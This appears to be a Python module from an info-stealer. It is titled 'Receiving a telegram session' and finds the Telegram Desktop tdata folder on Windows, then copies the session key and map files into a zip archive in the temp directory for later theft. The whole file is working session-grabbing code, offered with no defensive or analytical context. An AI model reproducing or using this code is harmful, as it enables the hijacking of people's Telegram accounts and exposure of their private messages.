# Import modules

import os
import zipfile


# Receiving a telegram session

__files = [
	'D877F783D5D3EF8Cs',
	'D877F783D5D3EF8C\\maps'
	]


def Scan():
 tdata = os.path.join(os.getenv('AppData'), 'Telegram Desktop\\tdata')
 return tdata


def TelegramGrab(archivePath=os.environ['TEMP'] + '\\' + 'tdata.zip', telegramDir=Scan()):
 if not os.path.exists(telegramDir):
  return None
 with zipfile.ZipFile(archivePath, 'w', zipfile.ZIP_DEFLATED) as archive:
  os.chdir(telegramDir)
  for file in __files:
   if os.path.exists(file):
    archive.write(file, os.path.join('tdata', file))
 os.chdir(os.getcwd())
 return archivePath